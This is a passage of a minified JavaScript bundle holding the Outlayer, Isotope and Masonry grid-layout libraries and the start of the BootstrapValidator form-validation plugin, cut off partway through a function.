                right: t.right - (e.paddingRight + e.borderRightWidth),
                bottom: t.bottom - (e.paddingBottom + e.borderBottomWidth)
            }
        }
        ,
        m.prototype._manageStamp = h,
        m.prototype._getElementOffset = function(t) {
            var e = t.getBoundingClientRect()
              , i = this._boundingRect
              , o = d(t)
              , n = {
                left: e.left - i.left - o.marginLeft,
                top: e.top - i.top - o.marginTop,
                right: i.right - e.right - o.marginRight,
                bottom: i.bottom - e.bottom - o.marginBottom
            };
            return n
        }
        ,
        m.prototype.handleEvent = function(t) {
            var e = "on" + t.type;
            this[e] && this[e](t)
        }
        ,
        m.prototype.bindResize = function() {
            this.isResizeBound || (i.bind(t, "resize", this),
            this.isResizeBound = !0)
        }
        ,
        m.prototype.unbindResize = function() {
            this.isResizeBound && i.unbind(t, "resize", this),
            this.isResizeBound = !1
        }
        ,
        m.prototype.onresize = function() {
            function t() {
                e.resize(),
                delete e.resizeTimeout
            }
            this.resizeTimeout && clearTimeout(this.resizeTimeout);
            var e = this;
            this.resizeTimeout = setTimeout(t, 100)
        }
        ,
        m.prototype.resize = function() {
            this.isResizeBound && this.needsResizeLayout() && this.layout()
        }
        ,
        m.prototype.needsResizeLayout = function() {
            var t = d(this.element)
              , e = this.size && t;
            return e && t.innerWidth !== this.size.innerWidth
        }
        ,
        m.prototype.addItems = function(t) {
            var e = this._itemize(t);
            return e.length && (this.items = this.items.concat(e)),
            e
        }
        ,
        m.prototype.appended = function(t) {
            var e = this.addItems(t);
            e.length && (this.layoutItems(e, !0),
            this.reveal(e))
        }
        ,
        m.prototype.prepended = function(t) {
            var e = this._itemize(t);
            if (e.length) {
                var i = this.items.slice(0);
                this.items = e.concat(i),
                this._resetLayout(),
                this._manageStamps(),
                this.layoutItems(e, !0),
                this.reveal(e),
                this.layoutItems(i)
            }
        }
        ,
        m.prototype.reveal = function(t) {
            var e = t && t.length;
            if (e)
                for (var i = 0; e > i; i++) {
                    var o = t[i];
                    o.reveal()
                }
        }
        ,
        m.prototype.hide = function(t) {
            var e = t && t.length;
            if (e)
                for (var i = 0; e > i; i++) {
                    var o = t[i];
                    o.hide()
                }
        }
        ,
        m.prototype.getItem = function(t) {
            for (var e = 0, i = this.items.length; i > e; e++) {
                var o = this.items[e];
                if (o.element === t)
                    return o
            }
        }
        ,
        m.prototype.getItems = function(t) {
            if (t && t.length) {
                for (var e = [], i = 0, o = t.length; o > i; i++) {
                    var n = t[i]
                      , r = this.getItem(n);
                    r && e.push(r)
                }
                return e
            }
        }
        ,
        m.prototype.remove = function(t) {
            t = o(t);
            var e = this.getItems(t);
            if (e && e.length) {
                this._itemsOn(e, "remove", function() {
                    this.emitEvent("removeComplete", [this, e])
                });
                for (var i = 0, r = e.length; r > i; i++) {
                    var s = e[i];
                    s.remove(),
                    n(s, this.items)
                }
            }
        }
        ,
        m.prototype.destroy = function() {
            var t = this.element.style;
            t.height = "",
            t.position = "",
            t.width = "";
            for (var e = 0, i = this.items.length; i > e; e++) {
                var o = this.items[e];
                o.destroy()
            }
            this.unbindResize(),
            delete this.element.outlayerGUID,
            p && p.removeData(this.element, this.constructor.namespace)
        }
        ,
        m.data = function(t) {
            var e = t && t.outlayerGUID;
            return e && v[e]
        }
        ,
        m.create = function(t, i) {
            function o() {
                m.apply(this, arguments)
            }
            return Object.create ? o.prototype = Object.create(m.prototype) : e(o.prototype, m.prototype),
            o.prototype.constructor = o,
            o.defaults = e({}, m.defaults),
            e(o.defaults, i),
            o.prototype.settings = {},
            o.namespace = t,
            o.data = m.data,
            o.Item = function() {
                y.apply(this, arguments)
            }
            ,
            o.Item.prototype = new y,
            s(function() {
                for (var e = r(t), i = a.querySelectorAll(".js-" + e), n = "data-" + e + "-options", s = 0, h = i.length; h > s; s++) {
                    var f, c = i[s], d = c.getAttribute(n);
                    try {
                        f = d && JSON.parse(d)
                    } catch (l) {
                        u && u.error("Error parsing " + n + " on " + c.nodeName.toLowerCase() + (c.id ? "#" + c.id : "") + ": " + l);
                        continue
                    }
                    var y = new o(c,f);
                    p && p.data(c, t, y)
                }
            }),
            p && p.bridget && p.bridget(t, o),
            o
        }
        ,
        m.Item = y,
        m
    }
    var a = t.document
      , u = t.console
      , p = t.jQuery
      , h = function() {}
      , f = Object.prototype.toString
      , c = "object" == typeof HTMLElement ? function(t) {
        return t instanceof HTMLElement
    }
    : function(t) {
        return t && "object" == typeof t && 1 === t.nodeType && "string" == typeof t.nodeName
    }
      , d = Array.prototype.indexOf ? function(t, e) {
        return t.indexOf(e)
    }
    : function(t, e) {
        for (var i = 0, o = t.length; o > i; i++)
            if (t[i] === e)
                return i;
        return -1
    }
    ;
    "function" == typeof define && define.amd ? define("outlayer/outlayer", ["eventie/eventie", "doc-ready/doc-ready", "eventEmitter/EventEmitter", "get-size/get-size", "matches-selector/matches-selector", "./item"], s) : t.Outlayer = s(t.eventie, t.docReady, t.EventEmitter, t.getSize, t.matchesSelector, t.Outlayer.Item)
}(window),
function(t) {
    function e(t) {
        function e() {
            t.Item.apply(this, arguments)
        }
        return e.prototype = new t.Item,
        e.prototype._create = function() {
            this.id = this.layout.itemGUID++,
            t.Item.prototype._create.call(this),
            this.sortData = {}
        }
        ,
        e.prototype.updateSortData = function() {
            if (!this.isIgnored) {
                this.sortData.id = this.id,
                this.sortData["original-order"] = this.id,
                this.sortData.random = Math.random();
                var t = this.layout.options.getSortData
                  , e = this.layout._sorters;
                for (var i in t) {
                    var o = e[i];
                    this.sortData[i] = o(this.element, this)
                }
            }
        }
        ,
        e
    }
    "function" == typeof define && define.amd ? define("isotope/js/item", ["outlayer/outlayer"], e) : (t.Isotope = t.Isotope || {},
    t.Isotope.Item = e(t.Outlayer))
}(window),
function(t) {
    function e(t, e) {
        function i(t) {
            this.isotope = t,
            t && (this.options = t.options[this.namespace],
            this.element = t.element,
            this.items = t.filteredItems,
            this.size = t.size)
        }
        return function() {
            function t(t) {
                return function() {
                    return e.prototype[t].apply(this.isotope, arguments)
                }
            }
            for (var o = ["_resetLayout", "_getItemLayoutPosition", "_manageStamp", "_getContainerSize", "_getElementOffset", "needsResizeLayout"], n = 0, r = o.length; r > n; n++) {
                var s = o[n];
                i.prototype[s] = t(s)
            }
        }(),
        i.prototype.needsVerticalResizeLayout = function() {
            var e = t(this.isotope.element)
              , i = this.isotope.size && e;
            return i && e.innerHeight !== this.isotope.size.innerHeight
        }
        ,
        i.prototype._getMeasurement = function() {
            this.isotope._getMeasurement.apply(this, arguments)
        }
        ,
        i.prototype.getColumnWidth = function() {
            this.getSegmentSize("column", "Width")
        }
        ,
        i.prototype.getRowHeight = function() {
            this.getSegmentSize("row", "Height")
        }
        ,
        i.prototype.getSegmentSize = function(t, e) {
            var i = t + e
              , o = "outer" + e;
            if (this._getMeasurement(i, o),
            !this[i]) {
                var n = this.getFirstItemSize();
                this[i] = n && n[o] || this.isotope.size["inner" + e]
            }
        }
        ,
        i.prototype.getFirstItemSize = function() {
            var e = this.isotope.filteredItems[0];
            return e && e.element && t(e.element)
        }
        ,
        i.prototype.layout = function() {
            this.isotope.layout.apply(this.isotope, arguments)
        }
        ,
        i.prototype.getSize = function() {
            this.isotope.getSize(),
            this.size = this.isotope.size
        }
        ,
        i.modes = {},
        i.create = function(t, e) {
            function o() {
                i.apply(this, arguments)
            }
            return o.prototype = new i,
            e && (o.options = e),
            o.prototype.namespace = t,
            i.modes[t] = o,
            o
        }
        ,
        i
    }
    "function" == typeof define && define.amd ? define("isotope/js/layout-mode", ["get-size/get-size", "outlayer/outlayer"], e) : (t.Isotope = t.Isotope || {},
    t.Isotope.LayoutMode = e(t.getSize, t.Outlayer))
}(window),
function(t) {
    function e(t, e) {
        var o = t.create("masonry");
        return o.prototype._resetLayout = function() {
            this.getSize(),
            this._getMeasurement("columnWidth", "outerWidth"),
            this._getMeasurement("gutter", "outerWidth"),
            this.measureColumns();
            var t = this.cols;
            for (this.colYs = []; t--; )
                this.colYs.push(0);
            this.maxY = 0
        }
        ,
        o.prototype.measureColumns = function() {
            if (this.getContainerWidth(),
            !this.columnWidth) {
                var t = this.items[0]
                  , i = t && t.element;
                this.columnWidth = i && e(i).outerWidth || this.containerWidth
            }
            this.columnWidth += this.gutter,
            this.cols = Math.floor((this.containerWidth + this.gutter) / this.columnWidth),
            this.cols = Math.max(this.cols, 1)
        }
        ,
        o.prototype.getContainerWidth = function() {
            var t = this.options.isFitWidth ? this.element.parentNode : this.element
              , i = e(t);
            this.containerWidth = i && i.innerWidth
        }
        ,
        o.prototype._getItemLayoutPosition = function(t) {
            t.getSize();
            var e = t.size.outerWidth % this.columnWidth
              , o = e && 1 > e ? "round" : "ceil"
              , n = Math[o](t.size.outerWidth / this.columnWidth);
            n = Math.min(n, this.cols);
            for (var r = this._getColGroup(n), s = Math.min.apply(Math, r), a = i(r, s), u = {
                x: this.columnWidth * a,
                y: s
            }, p = s + t.size.outerHeight, h = this.cols + 1 - r.length, f = 0; h > f; f++)
                this.colYs[a + f] = p;
            return u
        }
        ,
        o.prototype._getColGroup = function(t) {
            if (2 > t)
                return this.colYs;
            for (var e = [], i = this.cols + 1 - t, o = 0; i > o; o++) {
                var n = this.colYs.slice(o, o + t);
                e[o] = Math.max.apply(Math, n)
            }
            return e
        }
        ,
        o.prototype._manageStamp = function(t) {
            var i = e(t)
              , o = this._getElementOffset(t)
              , n = this.options.isOriginLeft ? o.left : o.right
              , r = n + i.outerWidth
              , s = Math.floor(n / this.columnWidth);
            s = Math.max(0, s);
            var a = Math.floor(r / this.columnWidth);
            a -= r % this.columnWidth ? 0 : 1,
            a = Math.min(this.cols - 1, a);
            for (var u = (this.options.isOriginTop ? o.top : o.bottom) + i.outerHeight, p = s; a >= p; p++)
                this.colYs[p] = Math.max(u, this.colYs[p])
        }
        ,
        o.prototype._getContainerSize = function() {
            this.maxY = Math.max.apply(Math, this.colYs);
            var t = {
                height: this.maxY
            };
            return this.options.isFitWidth && (t.width = this._getContainerFitWidth()),
            t
        }
        ,
        o.prototype._getContainerFitWidth = function() {
            for (var t = 0, e = this.cols; --e && 0 === this.colYs[e]; )
                t++;
            return (this.cols - t) * this.columnWidth - this.gutter
        }
        ,
        o.prototype.needsResizeLayout = function() {
            var t = this.containerWidth;
            return this.getContainerWidth(),
            t !== this.containerWidth
        }
        ,
        o
    }
    var i = Array.prototype.indexOf ? function(t, e) {
        return t.indexOf(e)
    }
    : function(t, e) {
        for (var i = 0, o = t.length; o > i; i++) {
            var n = t[i];
            if (n === e)
                return i
        }
        return -1
    }
    ;
    "function" == typeof define && define.amd ? define("masonry/masonry", ["outlayer/outlayer", "get-size/get-size"], e) : t.Masonry = e(t.Outlayer, t.getSize)
}(window),
function(t) {
    function e(t, e) {
        for (var i in e)
            t[i] = e[i];
        return t
    }
    function i(t, i) {
        var o = t.create("masonry")
          , n = o.prototype._getElementOffset
          , r = o.prototype.layout
          , s = o.prototype._getMeasurement;
        e(o.prototype, i.prototype),
        o.prototype._getElementOffset = n,
        o.prototype.layout = r,
        o.prototype._getMeasurement = s;
        var a = o.prototype.measureColumns;
        o.prototype.measureColumns = function() {
            this.items = this.isotope.filteredItems,
            a.call(this)
        }
        ;
        var u = o.prototype._manageStamp;
        return o.prototype._manageStamp = function() {
            this.options.isOriginLeft = this.isotope.options.isOriginLeft,
            this.options.isOriginTop = this.isotope.options.isOriginTop,
            u.apply(this, arguments)
        }
        ,
        o
    }
    "function" == typeof define && define.amd ? define("isotope/js/layout-modes/masonry", ["../layout-mode", "masonry/masonry"], i) : i(t.Isotope.LayoutMode, t.Masonry)
}(window),
function(t) {
    function e(t) {
        var e = t.create("fitRows");
        return e.prototype._resetLayout = function() {
            this.x = 0,
            this.y = 0,
            this.maxY = 0
        }
        ,
        e.prototype._getItemLayoutPosition = function(t) {
            t.getSize(),
            0 !== this.x && t.size.outerWidth + this.x > this.isotope.size.innerWidth && (this.x = 0,
            this.y = this.maxY);
            var e = {
                x: this.x,
                y: this.y
            };
            return this.maxY = Math.max(this.maxY, this.y + t.size.outerHeight),
            this.x += t.size.outerWidth,
            e
        }
        ,
        e.prototype._getContainerSize = function() {
            return {
                height: this.maxY
            }
        }
        ,
        e
    }
    "function" == typeof define && define.amd ? define("isotope/js/layout-modes/fit-rows", ["../layout-mode"], e) : e(t.Isotope.LayoutMode)
}(window),
function(t) {
    function e(t) {
        var e = t.create("vertical", {
            horizontalAlignment: 0
        });
        return e.prototype._resetLayout = function() {
            this.y = 0
        }
        ,
        e.prototype._getItemLayoutPosition = function(t) {
            t.getSize();
            var e = (this.isotope.size.innerWidth - t.size.outerWidth) * this.options.horizontalAlignment
              , i = this.y;
            return this.y += t.size.outerHeight,
            {
                x: e,
                y: i
            }
        }
        ,
        e.prototype._getContainerSize = function() {
            return {
                height: this.y
            }
        }
        ,
        e
    }
    "function" == typeof define && define.amd ? define("isotope/js/layout-modes/vertical", ["../layout-mode"], e) : e(t.Isotope.LayoutMode)
}(window),
function(t) {
    function e(t, e) {
        for (var i in e)
            t[i] = e[i];
        return t
    }
    function i(t) {
        return "[object Array]" === h.call(t)
    }
    function o(t) {
        var e = [];
        if (i(t))
            e = t;
        else if (t && "number" == typeof t.length)
            for (var o = 0, n = t.length; n > o; o++)
                e.push(t[o]);
        else
            e.push(t);
        return e
    }
    function n(t, e) {
        var i = f(e, t);
        -1 !== i && e.splice(i, 1)
    }
    function r(t, i, r, u, h) {
        function f(t, e) {
            return function(i, o) {
                for (var n = 0, r = t.length; r > n; n++) {
                    var s = t[n]
                      , a = i.sortData[s]
                      , u = o.sortData[s];
                    if (a > u || u > a) {
                        var p = void 0 !== e[s] ? e[s] : e
                          , h = p ? 1 : -1;
                        return (a > u ? 1 : -1) * h
                    }
                }
                return 0
            }
        }
        var c = t.create("isotope", {
            layoutMode: "masonry",
            isJQueryFiltering: !0,
            sortAscending: !0
        });
        c.Item = u,
        c.LayoutMode = h,
        c.prototype._create = function() {
            this.itemGUID = 0,
            this._sorters = {},
            this._getSorters(),
            t.prototype._create.call(this),
            this.modes = {},
            this.filteredItems = this.items,
            this.sortHistory = ["original-order"];
            for (var e in h.modes)
                this._initLayoutMode(e)
        }
        ,
        c.prototype.reloadItems = function() {
            this.itemGUID = 0,
            t.prototype.reloadItems.call(this)
        }
        ,
        c.prototype._itemize = function() {
            for (var e = t.prototype._itemize.apply(this, arguments), i = 0, o = e.length; o > i; i++) {
                var n = e[i];
                n.id = this.itemGUID++
            }
            return this._updateItemsSortData(e),
            e
        }
        ,
        c.prototype._initLayoutMode = function(t) {
            var i = h.modes[t]
              , o = this.options[t] || {};
            this.options[t] = i.options ? e(i.options, o) : o,
            this.modes[t] = new i(this)
        }
        ,
        c.prototype.layout = function() {
            return !this._isLayoutInited && this.options.isInitLayout ? (this.arrange(),
            void 0) : (this._layout(),
            void 0)
        }
        ,
        c.prototype._layout = function() {
            var t = this._getIsInstant();
            this._resetLayout(),
            this._manageStamps(),
            this.layoutItems(this.filteredItems, t),
            this._isLayoutInited = !0
        }
        ,
        c.prototype.arrange = function(t) {
            this.option(t),
            this._getIsInstant(),
            this.filteredItems = this._filter(this.items),
            this._sort(),
            this._layout()
        }
        ,
        c.prototype._init = c.prototype.arrange,
        c.prototype._getIsInstant = function() {
            var t = void 0 !== this.options.isLayoutInstant ? this.options.isLayoutInstant : !this._isLayoutInited;
            return this._isInstant = t,
            t
        }
        ,
        c.prototype._filter = function(t) {
            function e() {
                f.reveal(n),
                f.hide(r)
            }
            var i = this.options.filter;
            i = i || "*";
            for (var o = [], n = [], r = [], s = this._getFilterTest(i), a = 0, u = t.length; u > a; a++) {
                var p = t[a];
                if (!p.isIgnored) {
                    var h = s(p);
                    h && o.push(p),
                    h && p.isHidden ? n.push(p) : h || p.isHidden || r.push(p)
                }
            }
            var f = this;
            return this._isInstant ? this._noTransition(e) : e(),
            o
        }
        ,
        c.prototype._getFilterTest = function(t) {
            return s && this.options.isJQueryFiltering ? function(e) {
                return s(e.element).is(t)
            }
            : "function" == typeof t ? function(e) {
                return t(e.element)
            }
            : function(e) {
                return r(e.element, t)
            }
        }
        ,
        c.prototype.updateSortData = function(t) {
            this._getSorters(),
            t = o(t);
            var e = this.getItems(t);
            e = e.length ? e : this.items,
            this._updateItemsSortData(e)
        }
        ,
        c.prototype._getSorters = function() {
            var t = this.options.getSortData;
            for (var e in t) {
                var i = t[e];
                this._sorters[e] = d(i)
            }
        }
        ,
        c.prototype._updateItemsSortData = function(t) {
            for (var e = 0, i = t.length; i > e; e++) {
                var o = t[e];
                o.updateSortData()
            }
        }
        ;
        var d = function() {
            function t(t) {
                if ("string" != typeof t)
                    return t;
                var i = a(t).split(" ")
                  , o = i[0]
                  , n = o.match(/^\[(.+)\]$/)
                  , r = n && n[1]
                  , s = e(r, o)
                  , u = c.sortDataParsers[i[1]];
                return t = u ? function(t) {
                    return t && u(s(t))
                }
                : function(t) {
                    return t && s(t)
                }
            }
            function e(t, e) {
                var i;
                return i = t ? function(e) {
                    return e.getAttribute(t)
                }
                : function(t) {
                    var i = t.querySelector(e);
                    return i && p(i)
                }
            }
            return t
        }();
        c.sortDataParsers = {
            parseInt: function(t) {
                return parseInt(t, 10)
            },
            parseFloat: function(t) {
                return parseFloat(t)
            }
        },
        c.prototype._sort = function() {
            var t = this.options.sortBy;
            if (t) {
                var e = [].concat.apply(t, this.sortHistory)
                  , i = f(e, this.options.sortAscending);
                this.filteredItems.sort(i),
                t !== this.sortHistory[0] && this.sortHistory.unshift(t)
            }
        }
        ,
        c.prototype._mode = function() {
            var t = this.options.layoutMode
              , e = this.modes[t];
            if (!e)
                throw Error("No layout mode: " + t);
            return e.options = this.options[t],
            e
        }
        ,
        c.prototype._resetLayout = function() {
            t.prototype._resetLayout.call(this),
            this._mode()._resetLayout()
        }
        ,
        c.prototype._getItemLayoutPosition = function(t) {
            return this._mode()._getItemLayoutPosition(t)
        }
        ,
        c.prototype._manageStamp = function(t) {
            this._mode()._manageStamp(t)
        }
        ,
        c.prototype._getContainerSize = function() {
            return this._mode()._getContainerSize()
        }
        ,
        c.prototype.needsResizeLayout = function() {
            return this._mode().needsResizeLayout()
        }
        ,
        c.prototype.appended = function(t) {
            var e = this.addItems(t);
            if (e.length) {
                var i = this._filterRevealAdded(e);
                this.filteredItems = this.filteredItems.concat(i)
            }
        }
        ,
        c.prototype.prepended = function(t) {
            var e = this._itemize(t);
            if (e.length) {
                var i = this.items.slice(0);
                this.items = e.concat(i),
                this._resetLayout(),
                this._manageStamps();
                var o = this._filterRevealAdded(e);
                this.layoutItems(i),
                this.filteredItems = o.concat(this.filteredItems)
            }
        }
        ,
        c.prototype._filterRevealAdded = function(t) {
            var e = this._noTransition(function() {
                return this._filter(t)
            });
            return this.layoutItems(e, !0),
            this.reveal(e),
            t
        }
        ,
        c.prototype.insert = function(t) {
            var e = this.addItems(t);
            if (e.length) {
                var i, o, n = e.length;
                for (i = 0; n > i; i++)
                    o = e[i],
                    this.element.appendChild(o.element);
                var r = this._filter(e);
                for (this._noTransition(function() {
                    this.hide(r)
                }),
                i = 0; n > i; i++)
                    e[i].isLayoutInstant = !0;
                for (this.arrange(),
                i = 0; n > i; i++)
                    delete e[i].isLayoutInstant;
                this.reveal(r)
            }
        }
        ;
        var l = c.prototype.remove;
        return c.prototype.remove = function(t) {
            t = o(t);
            var e = this.getItems(t);
            if (l.call(this, t),
            e && e.length)
                for (var i = 0, r = e.length; r > i; i++) {
                    var s = e[i];
                    n(s, this.filteredItems)
                }
        }
        ,
        c.prototype._noTransition = function(t) {
            var e = this.options.transitionDuration;
            this.options.transitionDuration = 0;
            var i = t.call(this);
            return this.options.transitionDuration = e,
            i
        }
        ,
        c
    }
    var s = t.jQuery
      , a = String.prototype.trim ? function(t) {
        return t.trim()
    }
    : function(t) {
        return t.replace(/^\s+|\s+$/g, "")
    }
      , u = document.documentElement
      , p = u.textContent ? function(t) {
        return t.textContent
    }
    : function(t) {
        return t.innerText
    }
      , h = Object.prototype.toString
      , f = Array.prototype.indexOf ? function(t, e) {
        return t.indexOf(e)
    }
    : function(t, e) {
        for (var i = 0, o = t.length; o > i; i++)
            if (t[i] === e)
                return i;
        return -1
    }
    ;
    "function" == typeof define && define.amd ? define(["outlayer/outlayer", "get-size/get-size", "matches-selector/matches-selector", "isotope/js/item", "isotope/js/layout-mode", "isotope/js/layout-modes/masonry", "isotope/js/layout-modes/fit-rows", "isotope/js/layout-modes/vertical"], r) : t.Isotope = r(t.Outlayer, t.getSize, t.matchesSelector, t.Isotope.Item, t.Isotope.LayoutMode)
}(window);
!function(a) {
    var b = function(c, d) {
        this.$form = a(c),
        this.options = a.extend({}, b.DEFAULT_OPTIONS, d),
        this.$invalidFields = a([]),
        this.$submitButton = null,
        this.STATUS_NOT_VALIDATED = "NOT_VALIDATED",
        this.STATUS_VALIDATING = "VALIDATING",
        this.STATUS_INVALID = "INVALID",
        this.STATUS_VALID = "VALID";
        var e = function() {
            for (var a = 3, b = document.createElement("div"), c = b.all || []; b.innerHTML = "<!--[if gt IE " + ++a + "]><br><![endif]-->",
            c[0]; )
                ;
            return a > 4 ? a : !a
        }()
          , f = document.createElement("div");
        this._changeEvent = 9 !== e && "oninput"in f ? "input" : "keyup",
        this._submitIfValid = null,
        this._cacheFields = {},
        this._init()
    };
    b.DEFAULT_OPTIONS = {
        elementClass: "bv-form",
        message: "This value is not valid",
        container: null,
        threshold: null,
        excluded: [":disabled", ":hidden", ":not(:visible)"],
        feedbackIcons: {
            valid: null,
            invalid: null,
            validating: null
        },
        submitButtons: '[type="submit"]',
        submitHandler: null,
        live: "enabled",
        fields: {}
    },
    b.prototype = {
        constructor: b,
        _init: function() {
            var b = this
              , c = {
                excluded: this.$form.attr("data-bv-excluded"),
                trigger: this.$form.attr("data-bv-trigger"),
                message: this.$form.attr("data-bv-message"),
                container: this.$form.attr("data-bv-container"),
                submitButtons: this.$form.attr("data-bv-submitbuttons"),
                threshold: this.$form.attr("data-bv-threshold"),
                live: this.$form.attr("data-bv-live"),
                fields: {},
                feedbackIcons: {
                    valid: this.$form.attr("data-bv-feedbackicons-valid"),
                    invalid: this.$form.attr("data-bv-feedbackicons-invalid"),
                    validating: this.$form.attr("data-bv-feedbackicons-validating")
                }
            };
            this.$form.attr("novalidate", "novalidate").addClass(this.options.elementClass).on("submit.bv", function(a) {
                a.preventDefault(),
                b.validate()
            }).on("click.bv", this.options.submitButtons, function() {
                b.$submitButton = a(this),
                b._submitIfValid = !0
            }).find("[name], [data-bv-field]").each(function() {
                var d = a(this);
                if (!b._isExcluded(d)) {
                    var e = d.attr("name") || d.attr("data-bv-field")
                      , f = b._parseOptions(d);
                    f && (d.attr("data-bv-field", e),
                    c.fields[e] = a.extend({}, f, c.fields[e]))
                }
            }),
            this.options = a.extend(!0, this.options, c);
            for (var d in this.options.fields)
                this._initField(d);
            this.$form.trigger(a.Event("init.form.bv"), {
                options: this.options
            })
        },
        _parseOptions: function(b) {
            var c, d, e, f, g, h, i, j = b.attr("name") || b.attr("data-bv-field"), k = {};
            for (d in a.fn.bootstrapValidator.validators)
                if (c = a.fn.bootstrapValidator.validators[d],
                e = b.attr("data-bv-" + d.toLowerCase()) + "",
                i = "function" == typeof c.enableByHtml5 ? c.enableByHtml5(b) : null,
                i && "false" != e || i !== !0 && ("" == e || "true" == e)) {
                    c.html5Attributes = c.html5Attributes || {
                        message: "message"
                    },
                    k[d] = a.extend({}, 1 == i ? {} : i, k[d]);
                    for (h in c.html5Attributes)
                        f = c.html5Attributes[h],
                        g = b.attr("data-bv-" + d.toLowerCase() + "-" + h),
                        g && ("true" == g ? g = !0 : "false" == g && (g = !1),
                        k[d][f] = g)
                }
            var l = {
                feedbackIcons: b.attr("data-bv-feedbackicons"),
                trigger: b.attr("data-bv-trigger"),
                message: b.attr("data-bv-message"),
                container: b.attr("data-bv-container"),
                selector: b.attr("data-bv-selector"),
                threshold: b.attr("data-bv-threshold"),
                validators: k
            }
              , m = a.isEmptyObject(l)
              , n = a.isEmptyObject(k);
            return !n || !m && this.options.fields[j] ? (l.validators = k,
            l) : null
        },
        _initField: function(b) {
            var c = a([]);
            switch (typeof b) {
            case "object":
                c = b,
                b = b.attr("data-bv-field");
                break;
            case "string":
                c = this.getFieldElements(b),
                c.attr("data-bv-field", b)
            }
            if (null != this.options.fields[b] && null != this.options.fields[b].validators) {
                if (0 == c.length)
                    return void delete this.options.fields[b];
                for (var d in this.options.fields[b].validators)
                    a.fn.bootstrapValidator.validators[d] || delete this.options.fields[b].validators[d];
                null == this.options.fields[b].enabled && (this.options.fields[b].enabled = !0);
                for (var e = this, f = c.length, g = c.attr("type"), h = 1 == f || "radio" == g || "checkbox" == g, i = 0; f > i; i++) {
                    var j = c.eq(i)
                      , k = j.parents(".form-group")
                      , l = this.options.fields[b].container || this.options.container
                      , m = l && "tooltip" != l && "popover" != l ? a(l) : this._getMessageContainer(j);
                    l && "tooltip" != l && "popover" != l && m.addClass("has-error"),
                    m.find('.help-block[data-bv-validator][data-bv-for="' + b + '"]').remove(),
                    k.find('i[data-bv-icon-for="' + b + '"]').remove();
                    var n = "radio" == g || "checkbox" == g || "file" == g || "SELECT" == j.get(0).tagName ? "change" : this._changeEvent;
                    j.off(n + ".update.bv").on(n + ".update.bv", function() {
                        e._submitIfValid = !1,
                        e.updateStatus(a(this), e.STATUS_NOT_VALIDATED)
                    }),
                    j.data("bv.messages", m);
                    for (var d in this.options.fields[b].validators)
                        j.data("bv.result." + d, this.STATUS_NOT_VALIDATED),
                        h && i != f - 1 || a("<small/>").css("display", "none").addClass("help-block").attr("data-bv-validator", d).attr("data-bv-for", b).attr("data-bv-result", this.STATUS_NOT_VALIDATED).html(this.options.fields[b].validators[d].message || this.options.fields[b].message || this.options.message).appendTo(m);
                    if (this.options.fields[b].feedbackIcons !== !1 && "false" !== this.options.fields[b].feedbackIcons && this.options.feedbackIcons && this.options.feedbackIcons.validating && this.options.feedbackIcons.invalid && this.options.feedbackIcons.valid && (!h || i == f - 1)) {
                        k.removeClass("has-success").removeClass("has-error").addClass("has-feedback");
                        var o = a("<i/>").css("display", "none").addClass("form-control-feedback").attr("data-bv-icon-for", b).insertAfter("checkbox" == g || "radio" == g ? j.parent() : j);
                        0 == k.find("label").length && o.css("top", 0),
                        0 != k.find(".input-group-addon").length && o.css({
                            top: 0,
                            "z-index": 100
                        })
                    }
                }
                var p = this.options.fields[b].trigger || this.options.trigger || n
                  , q = a.map(p.split(" "), function(a) {
                    return a + ".live.bv"
                }).join(" ");
                switch (this.options.live) {
                case "submitted":
                    break;
                case "disabled":
                    c.off(q);
                    break;
                case "enabled":
                default:
                    c.off(q).on(q, function() {
                        e._exceedThreshold(a(this)) && e.validateField(a(this))
                    })
                }
                this.$form.trigger(a.Event("init.field.bv"), {
                    field: b,
                    element: c
                })
            }
        },
        _getMessageContainer: function(a) {
            var b = a.parent();
            if (b.hasClass("form-group"))
                return b;
            var c = b.attr("class");
            if (!c)
                return this._getMessageContainer(b);
            c = c.split(" ");
            for (var d = c.length, e = 0; d > e; e++)
                if (/^col-(xs|sm|md|lg)-\d+$/.test(c[e]) || /^col-(xs|sm|md|lg)-offset-\d+$/.test(c[e]))
                    return b;
            return this._getMessageContainer(b)
        },
        _submit: function() {
            var b = this.isValid()
              , c = b ? "success.form.bv" : "error.form.bv"
              , d = a.Event(c);
            this.$form.trigger(d),
            this.$submitButton && (b ? this._onSuccess(d) : this._onError(d))
        },
        _isExcluded: function(b) {
            if (this.options.excluded) {
                "string" == typeof this.options.excluded && (this.options.excluded = a.map(this.options.excluded.split(","), function(b) {
                    return a.trim(b)
                }));
                for (var c = this.options.excluded.length, d = 0; c > d; d++)
                    if ("string" == typeof this.options.excluded[d] && b.is(this.options.excluded[d]) || "function" == typeof this.options.excluded[d] && 1 == this.options.excluded[d].call(this, b, this))
                        return !0
            }
            return !1
        },
        _exceedThreshold: function(b) {
            var c = b.attr("data-bv-field")
              , d = this.options.fields[c].threshold || this.options.threshold;
            if (!d)
                return !0;
            var e = -1 != a.inArray(b.attr("type"), ["button", "checkbox", "file", "hidden", "image", "radio", "reset", "submit"]);
            return e || b.val().length >= d
        },
        _onError: function(b) {
            if (!b.isDefaultPrevented()) {
                if ("submitted" == this.options.live) {
                    this.options.live = "enabled";
                    var c = this;
                    for (var d in this.options.fields)
                        !function(b) {
                            var e = c.getFieldElements(b);
                            if (e.length) {
                                var f = a(e[0]).attr("type")
                                  , g = "radio" == f || "checkbox" == f || "file" == f || "SELECT" == a(e[0]).get(0).tagName ? "change" : c._changeEvent
                                  , h = c.options.fields[d].trigger || c.options.trigger || g
                                  , i = a.map(h.split(" "), function(a) {
                                    return a + ".live.bv"
                                }).join(" ");
                                e.off(i).on(i, function() {
                                    c._exceedThreshold(a(this)) && c.validateField(a(this))
                                })
                            }
                        }(d)
                }
                var e = this.$invalidFields.eq(0);
                if (e) {
                    var f, g = e.parents(".tab-pane");
                    g && (f = g.attr("id")) && a('a[href="#' + f + '"][data-toggle="tab"]').tab("show"),
                    e.focus()
                }
            }
        },
        _onSuccess: function(a) {
            a.isDefaultPrevented() || (this.options.submitHandler && "function" == typeof this.options.submitHandler ? this.options.submitHandler.call(this, this, this.$form) : this.disableSubmitButtons(!0).defaultSubmit())
        },
        _onFieldValidated: function(b, c) {
            var d = b.attr("data-bv-field")
              , e = this.options.fields[d].validators
              , f = {}
              , g = 0;
            if (c) {
                var h = {
                    field: d,
                    element: b,
                    validator: c
                };
                switch (b.data("bv.result." + c)) {
                case this.STATUS_INVALID:
                    this.$form.trigger(a.Event("error.validator.bv"), h);
                    break;
                case this.STATUS_VALID:
                    this.$form.trigger(a.Event("success.validator.bv"), h)
                }
            }
            f[this.STATUS_NOT_VALIDATED] = 0,
